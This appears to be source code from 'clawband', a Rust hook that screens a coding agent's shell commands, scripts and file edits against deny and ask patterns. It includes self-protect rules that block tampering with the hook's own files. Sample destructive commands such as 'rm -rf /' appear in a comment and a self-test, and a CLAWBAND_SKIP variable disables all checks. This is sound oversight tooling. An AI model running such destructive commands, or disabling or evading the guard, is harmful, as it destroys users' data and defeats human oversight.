237	fn project_config_dir() -> Option<PathBuf> {
238	    let pwd = env::var("PWD").ok()?;
239	    let path = PathBuf::from(pwd).join(".clawband");
240	    // Skip if it's the same as the global dir (home dir edge case)
241	    if path == config_dir() {
242	        return None;
243	    }
244	    if path.exists() {
245	        Some(path)
246	    } else {
247	        None
248	    }
249	}
250	
251	// ─── RTK prefix stripping ─────────────────────────────────────────────────────
252	
253	fn strip_rtk(cmd: &str) -> String {
254	    // Strip "rtk " and "rtk proxy " prefixes, then the git -C <dir> wrapper RTK adds
255	    let rtk = Regex::new(r"^rtk\s+(?:proxy\s+)?").unwrap();
256	    let git_c = Regex::new(r"^git\s+-C\s+\S+\s+").unwrap();
257	    let s = rtk.replace(cmd, "");
258	    git_c.replace(&s, "git ").into_owned()
259	}
260	
261	// ─── sqz suffix stripping ─────────────────────────────────────────────────────
262	
263	fn strip_sqz(cmd: &str) -> String {
264	    // sqz rewrites "git status" → "git status 2>&1 | sqz compress --cmd git"
265	    // Strip the appended sqz pipeline so patterns match the original command.
266	    let sqz = Regex::new(r"\s*2>&1\s*\|\s*sqz\s+compress\b.*$").unwrap();
267	    sqz.replace(cmd, "").into_owned()
268	}
269	
270	// ─── Script file scanning ────────────────────────────────────────────────────
271	// When an interpreter runs a script file, read it and check each line against
272	// deny/ask patterns. Handles shell, Python, JS/TS, Perl, and Lua files.
273	// Skips inline-execution flags (-c, -m, -e). Unreadable paths fail gracefully.
274	
275	fn path_basename(path: &str) -> &str {
276	    path.rsplit('/').next().unwrap_or(path)
277	}
278	
279	fn extract_script_path(command: &str) -> Option<String> {
280	    let interp = r"(?i)(?:sudo\s+)?(?:bash|sh|zsh|dash|python3?|node|deno|perl|ruby|lua[0-9.]*)";
281	
282	    // Input redirection: bash < /path/to/script
283	    let redir_re = Regex::new(&format!(r"(?i)^\s*{}\s+<\s+(.+)$", interp)).unwrap();
284	    if let Some(caps) = redir_re.captures(command) {
285	        let path_str = caps[1].trim().trim_matches('"').trim_matches('\'');
286	        if let Some(path) = path_str.split_whitespace().next() {
287	            return Some(path.to_string());
288	        }
289	    }
290	
291	    // Direct execution: ./script or ./script.sh — bash honours shebang, ignores extension
292	    let direct_re = Regex::new(r"(?i)^\s*(?:sudo\s+)?(\./\S+)").unwrap();
293	    if let Some(caps) = direct_re.captures(command) {
294	        let path_str = caps[1].trim().trim_matches('"').trim_matches('\'');
295	        if let Some(path) = path_str.split_whitespace().next() {
296	            return Some(path.to_string());
297	        }
298	    }
299	
300	    // Standard: interpreter [optional-flags] <path>
301	    let re = Regex::new(&format!(r"(?i)^\s*{}\s+((?:-[a-zA-Z]+\s+)*)(.+)$", interp)).unwrap();
302	    let caps = re.captures(command)?;
303	    let flags = &caps[1];
304	    // -c  → shell/python inline command string
305	    // -m  → python module (e.g. python3 -m pytest)
306	    // -e / --eval → node inline eval
307	    if Regex::new(r"(?:^|\s)-[a-zA-Z]*[cme][a-zA-Z]*(\s|$)")
308	        .unwrap()
309	        .is_match(flags)
310	    {
311	        return None;
312	    }
313	    let path_str = caps[2].trim().trim_matches('"').trim_matches('\'');
314	    // First token only — ignore script arguments after the path
315	    let path = path_str.split_whitespace().next()?;
316	    Some(path.to_string())
317	}
318	
319	fn scan_script_file(
320	    path: &str,
321	    deny_pats: &[Pattern],
322	    ask_pats: &[Pattern],
323	    allow_pats: &[Pattern],
324	) -> Option<(String, String)> {
325	    let content = fs::read_to_string(path).ok()?;
326	    let is_js = path.ends_with(".js")
327	        || path.ends_with(".mjs")
328	        || path.ends_with(".ts")
329	        || path.ends_with(".tsx");
330	    let is_lua = path.ends_with(".lua");
331	    let mut in_block_comment = false;
332	
333	    for (lineno, raw_line) in content.lines().enumerate() {
334	        let line = raw_line.trim();
335	        if line.is_empty() {
336	            continue;
337	        }
338	
339	        // JS/TS block comment state: /* ... */
340	        if is_js {
341	            if in_block_comment {
342	                if line.contains("*/") {
343	                    in_block_comment = false;
344	                }
345	                continue;
346	            }
347	            if line.starts_with("/*") {
348	                in_block_comment = !line.contains("*/");
349	                continue;
350	            }
351	            if line.starts_with("//") || line.starts_with('*') {
352	                continue;
353	            }
354	        }
355	
356	        // Lua comment state: --[[ ... ]] block comments and -- line comments
357	        if is_lua {
358	            if in_block_comment {
359	                if line.contains("]]") {
360	                    in_block_comment = false;
361	                }
362	                continue;
363	            }
364	            if line.starts_with("--[[") {
365	                in_block_comment = !line.contains("]]");
366	                continue;
367	            }
368	            if line.starts_with("--") {
369	                continue;
370	            }
371	        }
372	
373	        // Shell (#) and Python (#) and Perl (#) line comments
374	        if line.starts_with('#') {
375	            continue;
376	        }
377	
378	        // Reuse compound-command splitting so `foo && rm -rf /` is caught
379	        let clean = strip_safe_pipes(line);
380	        for segment in &split_segments(&clean) {
381	            if allow_pats.iter().any(|p| p.matches(segment)) {
382	                continue;
383	            }
384	            for pat in deny_pats {
385	                if pat.matches(segment) {
386	                    return Some((
387	                        "deny".into(),
388	                        format!(
389	                            "Blocked: '{}' in {}:{}: {}",
390	                            pat.label,
391	                            path,
392	                            lineno + 1,
393	                            segment
394	                        ),
395	                    ));
396	                }
397	            }
398	            for pat in ask_pats {
399	                if pat.matches(segment) {
400	                    return Some((
401	                        "ask".into(),
402	                        format!(
403	                            "Review before running — '{}' in {}:{}: {}\nTo always allow: clawband allow '{}'",
404	                            pat.label,
405	                            path,
406	                            lineno + 1,
407	                            segment,
408	                            pat.label
409	                        ),
410	                    ));
411	                }
412	            }
413	        }
414	    }
415	    None
416	}
417	
418	// ─── Git force push check ─────────────────────────────────────────────────────
419	
420	fn check_force_push(cmd: &str) -> Option<String> {
421	    // Only applies to git push commands
422	    if !Regex::new(r"(?i)\bgit\s+push\b").unwrap().is_match(cmd) {
423	        return None;
424	    }
425	    // Strip --force-with-lease (safe alternative) first
426	    let strip_fwl = Regex::new(r"(?i)--force-with-lease(?:=\S+)?").unwrap();
427	    let cleaned = strip_fwl.replace_all(cmd, "");
428	    // Then block --force or -f anywhere in the command
429	    if Regex::new(r"(?i)\s--force(\s|$)|\s-f(\s|$)")
430	        .unwrap()
431	        .is_match(&cleaned)
432	    {
433	        Some("Blocked: git push --force / -f (use --force-with-lease instead)".into())
434	    } else {
435	        None
436	    }
437	}
438	
439	// ─── Safe inline pipe stripping ───────────────────────────────────────────────
440	// Remove  | python3 -c "..."  and  | python3 -m mod  before pipe checks.
441	// These are visible inline code, not supply-chain risks.
442	
443	fn strip_safe_pipes(cmd: &str) -> String {
444	    let c = Regex::new(r"(?i)\|\s*(python3?|node)\s+-c\s+[^|;&`$]*").unwrap();
445	    let m = Regex::new(r"(?i)\|\s*(python3?|node)\s+-m\s+\S+").unwrap();
446	    let s = c.replace_all(cmd, "");
447	    m.replace_all(&s, "").into_owned()
448	}
449	
450	// ─── Compound command splitting ───────────────────────────────────────────────
451	// Split on &&, ||, ; and newlines.
452	// Single | is NOT a splitter — keeps pipe-to-interpreter in one segment.
453	// \; and \| are escaped before splitting so find -exec and regex patterns survive.
454	
455	fn split_segments(cmd: &str) -> Vec<String> {
456	    const ESC_SEMI: &str = "\x01S\x01";
457	    const ESC_PIPE: &str = "\x01P\x01";
458	    const SEP: &str = "\x01SEP\x01";
459	
460	    let s = cmd.replace("\\;", ESC_SEMI).replace("\\|", ESC_PIPE);
461	
462	    let splitter = Regex::new(r"[ \t]*(\|\||&&|;|\n)[ \t]*").unwrap();
463	    let s = splitter.replace_all(&s, SEP);
464	
465	    s.split(SEP)
466	        .map(|seg| seg.trim().replace(ESC_SEMI, "\\;").replace(ESC_PIPE, "\\|"))
467	        .filter(|s| !s.is_empty())
468	        .collect()
469	}
470	
471	// ─── PostToolUse breadcrumb ───────────────────────────────────────────────────
472	// Written by PreToolUse when decision is "ask". Read and deleted by `clawband post`
473	// (PostToolUse hook). If the command ran, PostToolUse fires and we know the user
474	// approved. If denied, PostToolUse never fires and the breadcrumb expires via TTL.
475	
476	fn breadcrumb_path() -> PathBuf {
477	    config_dir().join(".last-ask")
478	}
479	
480	fn write_ask_breadcrumb(reason: &str) {
481	    let cfg = config_dir();
482	    let _ = fs::create_dir_all(&cfg);
483	    let ts = std::time::SystemTime::now()
484	        .duration_since(std::time::UNIX_EPOCH)
485	        .map(|d| d.as_secs())
486	        .unwrap_or(0);
487	    if let Ok(mut f) = fs::OpenOptions::new()
488	        .write(true)
489	        .create(true)
490	        .truncate(true)
491	        .open(breadcrumb_path())
492	    {
493	        let _ = writeln!(f, "{}\n{}", ts, reason);
494	    }
495	}
496	
497	fn cmd_post() {
498	    let path = breadcrumb_path();
499	    let Ok(content) = fs::read_to_string(&path) else {
500	        return;
501	    };
502	    let _ = fs::remove_file(&path);
503	
504	    let mut lines = content.lines();
505	    let ts: u64 = lines.next().and_then(|l| l.parse().ok()).unwrap_or(0);
506	
507	    let now = std::time::SystemTime::now()
508	        .duration_since(std::time::UNIX_EPOCH)
509	        .map(|d| d.as_secs())
510	        .unwrap_or(0);
511	    if now.saturating_sub(ts) > 60 {
512	        return;
513	    }
514	
515	    let reason: String = lines.collect::<Vec<_>>().join("\n");
516	
517	    // Extract "clawband allow '<label>'" from the hint line if present.
518	    if let Some(pos) = reason.find("clawband allow '") {
519	        let snippet = reason[pos..].lines().next().unwrap_or("").trim();
520	        println!(
521	            "The user approved a clawband-prompted command. \
522	             Suggest they run `{}` to stop being prompted for this in future.",
523	            snippet
524	        );
525	    }
526	}
527	
528	// ─── Allow / deny commands ───────────────────────────────────────────────────
529	
530	fn cmd_add_pattern(file: &str, args: &[String]) {
531	    if args.is_empty() {
532	        eprintln!("Usage: clawband allow|deny [--project] <pattern>");
533	        std::process::exit(1);
534	    }
535	
536	    let (use_project, pattern_args) = if args[0] == "--project" {
537	        if args.len() < 2 {
538	            eprintln!("Usage: clawband allow|deny [--project] <pattern>");
539	            std::process::exit(1);
540	        }
541	        (true, &args[1..])
542	    } else {
543	        (false, args)
544	    };
545	
546	    let pattern = pattern_args.join(" ");
547	
548	    if Pattern::from_user(&pattern).is_none() {
549	        eprintln!("clawband: invalid regex: {}", pattern);
550	        std::process::exit(1);
551	    }
552	
553	    let cfg = if use_project {
554	        PathBuf::from(env::var("PWD").unwrap_or_else(|_| ".".to_string())).join(".clawband")
555	    } else {
556	        config_dir()
557	    };
558	    let _ = fs::create_dir_all(&cfg);
559	    let path = cfg.join(file);
560	
561	    match fs::OpenOptions::new().append(true).create(true).open(&path) {
562	        Ok(mut f) => {
563	            let _ = writeln!(f, "{}", pattern);
564	            let g = "\x1b[32m";
565	            let b = "\x1b[34m";
566	            let r = "\x1b[0m";
567	            let bold = "\x1b[1m";
568	            println!(
569	                "{}Added{} {}{}{} → {}{}{}",
570	                g,
571	                r,
572	                bold,
573	                pattern,
574	                r,
575	                b,
576	                path.display(),
577	                r
578	            );
579	        }
580	        Err(e) => {
581	            eprintln!("clawband: failed to write {}: {}", path.display(), e);
582	            std::process::exit(1);
583	        }
584	    }
585	}
586	
587	// ─── Protected-paths config ───────────────────────────────────────────────────
588	
589	/// Expand a leading `~/` or `~` to `$HOME/`.
590	fn expand_home(s: &str) -> String {
591	    let home = env::var("HOME").unwrap_or_default();
592	    if let Some(rest) = s.strip_prefix("~/") {
593	        format!("{}/{}", home, rest)
594	    } else if s == "~" {
595	        home
596	    } else {
597	        s.to_string()
598	    }
599	}
600	
601	/// Load protect.paths from a directory.  Each line is a case-insensitive regex
602	/// matched against the absolute target file path.  A leading `~/` is expanded
603	/// to `$HOME/` before compilation.
604	fn load_protect_patterns(dir: &std::path::Path) -> Vec<Pattern> {
605	    let path = dir.join("protect.paths");
606	    let Ok(text) = fs::read_to_string(&path) else {
607	        return vec![];
608	    };
609	    text.lines()
610	        .map(str::trim)
611	        .filter(|l| !l.is_empty() && !l.starts_with('#'))
612	        .map(expand_home)
613	        .filter_map(|l| Pattern::from_user(&l))
614	        .collect()
615	}
616	
617	/// Collect protect patterns from global (~/.clawband/) and project (.clawband/)
618	/// protect.paths files.
619	fn protect_patterns() -> Vec<Pattern> {
620	    let mut pats = load_protect_patterns(&config_dir());
621	    if let Some(proj) = project_config_dir() {
622	        pats.extend(load_protect_patterns(&proj));
623	    }
624	    pats
625	}
626	
627	/// Returns true if at least one protect.paths file exists (global or project).
628	fn protect_active() -> bool {
629	    let global = config_dir().join("protect.paths");
630	    if global.exists() {
631	        return true;
632	    }
633	    if let Some(proj) = project_config_dir() {
634	        if proj.join("protect.paths").exists() {
635	            return true;
636	        }
637	    }
638	    false
639	}
640	
641	/// Check whether an edit target path matches any protect pattern.
642	/// Pure helper (testable without env/FS — pass patterns in directly).
643	fn edit_protected(path: &str, pats: &[Pattern]) -> bool {
644	    pats.iter().any(|p| p.matches(path))
645	}
646	
647	/// Self-protect deny patterns added to the Bash check when protect_active().
648	/// These block shell commands that would tamper with clawband's own files.
649	/// They are anchored to specific file locations so they do NOT match
650	/// `brew upgrade clawband`, `clawband install`, or `bash install.sh`.
651	fn self_protect_deny_patterns() -> Vec<Pattern> {
652	    let specs: &[(&str, &str)] = &[
653	        // rm / mv / shred / truncate referencing clawband files
654	        (
655	            "rm clawband hook",
656	            r"\b(?:rm|mv|shred)\b[^|;&\n]*\.claude/hooks/clawband\b",
657	        ),
658	        (
659	            "rm clawband settings",
660	            r"\b(?:rm|mv|shred)\b[^|;&\n]*\.claude/settings\.json\b",
661	        ),
662	        (
663	            "rm clawband dir",
664	            r"\b(?:rm|mv|shred|truncate)\b[^|;&\n]*\.clawband/",
665	        ),
666	        (
667	            "truncate clawband hook",
668	            r"\btruncate\b[^|;&\n]*\.claude/hooks/clawband\b",
669	        ),
670	        (
671	            "truncate clawband settings",
672	            r"\btruncate\b[^|;&\n]*\.claude/settings\.json\b",
673	        ),
674	        // Output redirection > or >> to clawband files
675	        (
676	            "redirect to clawband hook",
677	            r">+\s*[^\n]*\.claude/hooks/clawband\b",
678	        ),
679	        (
680	            "redirect to clawband settings",
681	            r">+\s*[^\n]*\.claude/settings\.json\b",
682	        ),
683	        // sed -i targeting settings.json
684	        (
685	            "sed -i clawband settings",
686	            r"\bsed\b[^|;&\n]*-i[^|;&\n]*\.claude/settings\.json\b",
687	        ),
688	        // tee targeting settings.json
689	        (
690	            "tee clawband settings",
691	            r"\btee\b[^|;&\n]*\.claude/settings\.json\b",
692	        ),
693	        // chmod -x removing execute from the hook binary
694	        (
695	            "chmod -x clawband hook",
696	            r"\bchmod\b[^|;&\n]*-[a-zA-Z]*x[^|;&\n]*\.claude/hooks/clawband\b",
697	        ),
698	    ];
699	    specs.iter().map(|(l, p)| Pattern::builtin(l, p)).collect()
700	}

702	// ─── Install / verify ─────────────────────────────────────────────────────────
703	
704	const DENY_EXAMPLE: &str = include_str!("../deny.patterns.example");
705	const ASK_EXAMPLE: &str = include_str!("../ask.patterns.example");
706	const ALLOW_TEMPLATE: &str = "# allow.patterns — patterns that override deny/ask blocks\n\
707	# One pattern per line. Case-insensitive regex. Lines starting with # ignored.\n\
708	#\n\
709	# Example: allow git reset --hard only to HEAD\n\
710	# git reset --hard HEAD$\n";
711	
712	const PROTECT_PATHS_TEMPLATE: &str =
713	    "# protect.paths — clawband denies Write/Edit (and tamper Bash ops) on matching paths.\n\
714	# One regex per line, matched case-insensitively against the absolute file path.\n\
715	# A leading ~/ is expanded to your home directory.\n\
716	~/.claude/settings\\.json$\n\
717	~/.claude/hooks/clawband$\n\
718	~/.clawband/.*\n";
719	
720	fn settings_path() -> PathBuf {
721	    PathBuf::from(env::var("HOME").unwrap_or_default()).join(".claude/settings.json")
722	}
723	
724	// The command string to register in settings.json. Prefer the bare name when
725	// clawband is resolvable on PATH (stable across Homebrew upgrades); otherwise
726	// fall back to the absolute path of the running binary.
727	fn hook_command_string() -> String {
728	    if let Ok(exe) = env::current_exe() {
729	        if let Ok(canon_exe) = fs::canonicalize(&exe) {
730	            if let Ok(path) = env::var("PATH") {
731	                for dir in path.split(':') {
732	                    let candidate = PathBuf::from(dir).join("clawband");
733	                    if let Ok(canon) = fs::canonicalize(&candidate) {
734	                        if canon == canon_exe {
735	                            return "clawband".to_string();
736	                        }
737	                    }
738	                }
739	            }
740	        }
741	        return exe.to_string_lossy().into_owned();
742	    }
743	    "clawband".to_string()
744	}
745	
746	// Precisely identifies the clawband MAIN hook command — by executable basename,
747	// not substring. Excludes the `clawband post` companion. Robust against paths
748	// that happen to contain "icm"/"sqz" and against bare vs absolute forms.
749	fn is_clawband_main_command(cmd: &str) -> bool {
750	    let mut toks = cmd.split_whitespace();
751	    let Some(first) = toks.next() else {
752	        return false;
753	    };
754	    let base = first.rsplit('/').next().unwrap_or(first);
755	    if base != "clawband" {
756	        return false;
757	    }
758	    // `clawband post` is the PostToolUse companion, not the main hook
759	    toks.next() != Some("post")
760	}
761	
762	// Returns true if at least one clawband main hook is registered anywhere in PreToolUse.
763	fn clawband_hook_present(settings: &serde_json::Value) -> bool {
764	    settings["hooks"]["PreToolUse"]
765	        .as_array()
766	        .map(|entries| {
767	            entries.iter().any(|e| {
768	                e["hooks"].as_array().is_some_and(|hooks| {
769	                    hooks
770	                        .iter()
771	                        .any(|h| h["command"].as_str().is_some_and(is_clawband_main_command))
772	                })
773	            })
774	        })
775	        .unwrap_or(false)
776	}
777	
778	// Register the clawband PreToolUse hook, normalising to exactly one instance.
779	// - Removes every existing clawband main hook (self-heals duplicates), dropping
780	//   any entry left empty.
781	// - Re-adds a single hook: prepended into an existing `Bash` matcher entry if one
782	//   exists (so clawband runs first and there's no parallel Bash section), else a
783	//   new entry at the front.
784	// Returns true if the resulting settings differ from the input (i.e. a write is
785	// warranted), false if it was already correct (idempotent).
786	fn register_hook(settings: &mut serde_json::Value, command: &str) -> bool {
787	    use serde_json::json;
788	    if !settings.is_object() {
789	        *settings = json!({});
790	    }
791	    let obj = settings.as_object_mut().unwrap();
792	    let hooks_obj = obj.entry("hooks").or_insert_with(|| json!({}));
793	    if !hooks_obj.is_object() {
794	        *hooks_obj = json!({});
795	    }
796	    let pre_val = hooks_obj
797	        .as_object_mut()
798	        .unwrap()
799	        .entry("PreToolUse")
800	        .or_insert_with(|| json!([]));
801	    if !pre_val.is_array() {
802	        *pre_val = json!([]);
803	    }
804	    let before = pre_val.clone();
805	    let pre = pre_val.as_array_mut().unwrap();
806	
807	    // Strip all existing clawband main hooks from every entry.
808	    for entry in pre.iter_mut() {
809	        if let Some(hs) = entry["hooks"].as_array_mut() {
810	            hs.retain(|h| !h["command"].as_str().is_some_and(is_clawband_main_command));
811	        }
812	    }
813	    // Drop entries whose hooks array is now empty (e.g. a former clawband-only entry).
814	    pre.retain(|e| e["hooks"].as_array().map(|h| !h.is_empty()).unwrap_or(true));
815	
816	    let hook = json!({"type": "command", "command": command});
817	    // Prefer merging into an existing Bash matcher entry over a parallel section.
818	    if let Some(bash) = pre
819	        .iter_mut()
820	        .find(|e| e["matcher"].as_str() == Some("Bash") && e["hooks"].is_array())
821	    {
822	        bash["hooks"].as_array_mut().unwrap().insert(0, hook);
823	    } else {
824	        pre.insert(0, json!({"matcher": "Bash", "hooks": [hook]}));
825	    }
826	
827	    *pre_val != before
828	}
829	
830	/// Register a second PreToolUse hook entry with matcher "Write|Edit|MultiEdit|NotebookEdit"
831	/// pointing at the same clawband main command.  Idempotent — does nothing if an entry
832	/// whose matcher contains "Edit" already has a clawband main command.
833	/// Returns true if the settings were modified.
834	fn register_edit_hook(settings: &mut serde_json::Value, command: &str) -> bool {
835	    use serde_json::json;
836	    if !settings.is_object() {
837	        *settings = json!({});
838	    }
839	    let obj = settings.as_object_mut().unwrap();
840	    let hooks_obj = obj.entry("hooks").or_insert_with(|| json!({}));
841	    if !hooks_obj.is_object() {
842	        *hooks_obj = json!({});
843	    }
844	    let pre_val = hooks_obj
845	        .as_object_mut()
846	        .unwrap()
847	        .entry("PreToolUse")
848	        .or_insert_with(|| json!([]));
849	    if !pre_val.is_array() {
850	        *pre_val = json!([]);
851	    }
852	    let before = pre_val.clone();
853	    let pre = pre_val.as_array_mut().unwrap();
854	
855	    // Check if an entry with an "Edit"-containing matcher already has a clawband main command.
856	    let already = pre.iter().any(|e| {
857	        let matcher = e["matcher"].as_str().unwrap_or("");
858	        matcher.contains("Edit")
859	            && e["hooks"].as_array().is_some_and(|hooks| {
860	                hooks
861	                    .iter()
862	                    .any(|h| h["command"].as_str().is_some_and(is_clawband_main_command))
863	            })
864	    });
865	    if already {
866	        return false;
867	    }
868	
869	    let hook = json!({"type": "command", "command": command});
870	    pre.push(json!({"matcher": "Write|Edit|MultiEdit|NotebookEdit", "hooks": [hook]}));
871	
872	    *pre_val != before
873	}
874	
875	/// Returns true if the Write|Edit|MultiEdit|NotebookEdit protect hook is registered.
876	fn edit_hook_present(settings: &serde_json::Value) -> bool {
877	    settings["hooks"]["PreToolUse"]
878	        .as_array()
879	        .map(|entries| {
880	            entries.iter().any(|e| {
881	                let matcher = e["matcher"].as_str().unwrap_or("");
882	                matcher.contains("Edit")
883	                    && e["hooks"].as_array().is_some_and(|hooks| {
884	                        hooks
885	                            .iter()
886	                            .any(|h| h["command"].as_str().is_some_and(is_clawband_main_command))
887	                    })
888	            })
889	        })
890	        .unwrap_or(false)
891	}

893	fn cmd_install(extra_args: &[String]) {
894	    let protect = extra_args.iter().any(|a| a == "--protect");
895	
896	    let g = "\x1b[32m";
897	    let y = "\x1b[33m";
898	    let d = "\x1b[2m";
899	    let r = "\x1b[0m";
900	    let bold = "\x1b[1m";
901	
902	    // 1. Config dir + pattern templates
903	    let cfg = config_dir();
904	    let _ = fs::create_dir_all(&cfg);
905	    let seed = |name: &str, content: &str| {
906	        let p = cfg.join(name);
907	        if p.exists() {
908	            println!("  {d}exists{r}  {}", p.display());
909	        } else if fs::write(&p, content).is_ok() {
910	            println!("  {g}created{r} {}", p.display());
911	        } else {
912	            println!("  {y}failed{r} {}", p.display());
913	        }
914	    };
915	    println!("{bold}Config{r}");
916	    seed("deny.patterns", DENY_EXAMPLE);
917	    seed("ask.patterns", ASK_EXAMPLE);
918	    seed("allow.patterns", ALLOW_TEMPLATE);
919	
920	    // 2. Wire settings.json
921	    println!("\n{bold}Hook{r}");
922	    let path = settings_path();
923	    let _ = fs::create_dir_all(path.parent().unwrap_or(&PathBuf::from(".")));
924	    let mut settings: serde_json::Value = fs::read_to_string(&path)
925	        .ok()
926	        .and_then(|s| serde_json::from_str(&s).ok())
927	        .unwrap_or_else(|| serde_json::json!({}));
928	
929	    let command = hook_command_string();
930	    if register_hook(&mut settings, &command) {
931	        match serde_json::to_string_pretty(&settings) {
932	            Ok(out) => {
933	                if fs::write(&path, out + "\n").is_ok() {
934	                    println!(
935	                        "  {g}registered{r} PreToolUse Bash hook → {d}{}{r}",
936	                        command
937	                    );
938	                    println!("  {d}in {}{r}", path.display());
939	                } else {
940	                    println!("  {y}failed to write {}{r}", path.display());
941	                }
942	            }
943	            Err(_) => println!("  {y}failed to serialize settings{r}"),
944	        }
945	    } else {
946	        println!("  {d}already registered in {}{r}", path.display());
947	    }
948	
949	    // 3. Self-protect (--protect flag)
950	    if protect {
951	        println!("\n{bold}Self-protect{r}");
952	
953	        // Seed protect.paths if missing
954	        let pp = cfg.join("protect.paths");
955	        if pp.exists() {
956	            println!("  {d}exists{r}  {}", pp.display());
957	        } else if fs::write(&pp, PROTECT_PATHS_TEMPLATE).is_ok() {
958	            println!("  {g}created{r} {}", pp.display());
959	        } else {
960	            println!("  {y}failed{r} to create {}", pp.display());
961	        }
962	
963	        // Re-read settings (may have been written above)
964	        let mut settings2: serde_json::Value = fs::read_to_string(&path)
965	            .ok()
966	            .and_then(|s| serde_json::from_str(&s).ok())
967	            .unwrap_or_else(|| serde_json::json!({}));
968	
969	        if register_edit_hook(&mut settings2, &command) {
970	            match serde_json::to_string_pretty(&settings2) {
971	                Ok(out) => {
972	                    if fs::write(&path, out + "\n").is_ok() {
973	                        println!(
974	                            "  {g}registered{r} PreToolUse Write|Edit|MultiEdit|NotebookEdit hook → {d}{}{r}",
975	                            command
976	                        );
977	                    } else {
978	                        println!("  {y}failed to write {}{r}", path.display());
979	                    }
980	                }
981	                Err(_) => println!("  {y}failed to serialize settings{r}"),
982	            }
983	        } else {
984	            println!("  {d}edit hook already registered{r}");
985	        }
986	
987	        println!();
988	        println!("  Self-protect is now active.");
989	        println!("  Claude's Write/Edit tools are guarded against modifying protected paths.");
990	        println!("  Your own terminal is unaffected — only Claude Code's tools are guarded.");
991	        println!(
992	            "  Edit {}{}/protect.paths{r} to customise protected paths.",
993	            d,
994	            cfg.display(),
995	            r = r
996	        );
997	    }
998	
999	    println!("\n{g}Done.{r} Run {bold}/hooks{r} in Claude Code (or restart) to activate.");
1000	    println!("{d}Verify anytime with: clawband verify{r}");
1001	}

1003	fn cmd_verify() -> i32 {
1004	    let g = "\x1b[32m";
1005	    let y = "\x1b[33m";
1006	    let red = "\x1b[31m";
1007	    let d = "\x1b[2m";
1008	    let r = "\x1b[0m";
1009	    let bold = "\x1b[1m";
1010	    let ok = format!("{g}✓{r}");
1011	    let warn = format!("{y}!{r}");
1012	    let bad = format!("{red}✗{r}");
1013	
1014	    let mut failures = 0;
1015	    println!("\n{bold}clawband verify{r}\n");
1016	
1017	    // 1. Binary
1018	    match env::current_exe() {
1019	        Ok(p) => println!("  {ok} binary: {d}{}{r}", p.display()),
1020	        Err(_) => {
1021	            println!("  {bad} binary: could not resolve path");
1022	            failures += 1;
1023	        }
1024	    }
1025	
1026	    // 2. settings.json hook
1027	    let sp = settings_path();
1028	    let settings: Option<serde_json::Value> = fs::read_to_string(&sp)
1029	        .ok()
1030	        .and_then(|s| serde_json::from_str(&s).ok());
1031	    match &settings {
1032	        Some(v) if clawband_hook_present(v) => {
1033	            println!("  {ok} hook registered in {d}{}{r}", sp.display())
1034	        }
1035	        Some(_) => {
1036	            println!("  {bad} hook NOT registered — run: clawband install");
1037	            failures += 1;
1038	        }
1039	        None => {
1040	            println!("  {bad} {} missing or invalid JSON", sp.display());
1041	            failures += 1;
1042	        }
1043	    }
1044	
1045	    // 3. Config dir
1046	    let cfg = config_dir();
1047	    if cfg.exists() {
1048	        println!("  {ok} config dir: {d}{}{r}", cfg.display());
1049	    } else {
1050	        println!(
1051	            "  {warn} no config dir at {} {d}(built-in patterns still active){r}",
1052	            cfg.display()
1053	        );
1054	    }
1055	
1056	    // 4. CLAWBAND_SKIP
1057	    if env::var("CLAWBAND_SKIP").as_deref() == Ok("1") {
1058	        println!("  {bad} {red}{bold}CLAWBAND_SKIP=1 — ALL CHECKS DISABLED{r}");
1059	        failures += 1;
1060	    } else {
1061	        println!("  {ok} CLAWBAND_SKIP not set");
1062	    }
1063	
1064	    // 5. Self-test: prove the engine blocks and passes correctly
1065	    let dp = builtin_deny();
1066	    let ap = builtin_ask();
1067	    let no_allow: Vec<Pattern> = vec![];
1068	    let blocks = check_command("rm -rf /", &dp, &ap, &no_allow)
1069	        .map(|(d, _)| d == "deny")
1070	        .unwrap_or(false);
1071	    let passes = check_command("ls -la", &dp, &ap, &no_allow).is_none();
1072	    if blocks && passes {
1073	        println!("  {ok} self-test: engine blocks destructive + passes safe commands");
1074	    } else {
1075	        println!("  {bad} self-test FAILED (blocks={blocks}, passes={passes})");
1076	        failures += 1;
1077	    }
1078	
1079	    // 6. Self-protect status (informational — no failure if off)
1080	    let sp_paths_active = protect_active();
1081	    let sp_hook_active = settings.as_ref().map(edit_hook_present).unwrap_or(false);
1082	    if sp_paths_active && sp_hook_active {
1083	        println!("  {ok} self-protect: active (protect.paths + Write/Edit hook registered)");
1084	    } else if !sp_paths_active && !sp_hook_active {
1085	        println!("  {d}self-protect: off{r}  {d}(run: clawband install --protect to enable){r}");
1086	    } else {
1087	        println!(
1088	            "  {warn} self-protect: partial (paths_active={sp_paths_active}, edit_hook={sp_hook_active})"
1089	        );
1090	    }
1091	
1092	    if failures == 0 {
1093	        println!("\n{g}{bold}All checks passed.{r} clawband is active.\n");
1094	        0
1095	    } else {
1096	        println!("\n{red}{bold}{failures} check(s) failed.{r} See above.\n");
1097	        1
1098	    }
1099	}

1175	fn cmd_stats() {
1176	    const VERSION: &str = env!("CARGO_PKG_VERSION");
1177	    let cfg = config_dir();

1187	        (n, exists)
1188	    };
1189	    let (user_deny, deny_exists) = count_file("deny.patterns");
1190	    let (user_ask, ask_exists) = count_file("ask.patterns");

1192

1198	
1199	    // Parse audit log if present

1201	        fs::read_to_string(&log_path)
1202	            .unwrap_or_default()
1203	            .lines()
1204	            .fold((0u64, 0u64, 0u64), |(d, a, s), line| {
1205	                if line.contains("] DENY |") {
1206	                    (d + 1, a, s)
1207	                } else if line.contains("] ASK |") {
1208	                    (d, a + 1, s)
1209	                } else if line.contains("] SKIP |") {
1210	                    (d, a, s + 1)
1211	                } else {
1212	                    (d, a, s)
1213	                }
1214	            })
1215	    } else {
1216	        (0u64, 0u64, 0u64)
1217	    };
1218	
1219	    let g = "\x1b[32m"; // green
1220	    let y = "\x1b[33m"; // yellow
1221	    let b = "\x1b[34m"; // blue
1222	    let d = "\x1b[2m"; // dim
1223	    let r = "\x1b[0m"; // reset
1224	    let bold = "\x1b[1m";
1225	
1226	    println!("\n{bold}clawband v{VERSION}{r}\n");
1227	
1228	    println!("{bold}Built-in patterns{r}");
1229	    println!("  {g}deny{r}   {bold}{builtin_deny_count}{r}");
1230	    println!("  {y}ask{r}    {bold}{builtin_ask_count}{r}");
1231	
1232	    println!("\n{bold}Global patterns{r}  {d}(~/.clawband/){r}");
1233	    let file_status = |exists: bool, n: usize| -> String {
1234	        if !exists {
1235	            format!("{d}file not found{r}")
1236	        } else if n == 0 {
1237	            format!("{d}0 patterns{r}")
1238	        } else {
1239	            format!("{bold}{n}{r} loaded")
1240	        }
1241	    };

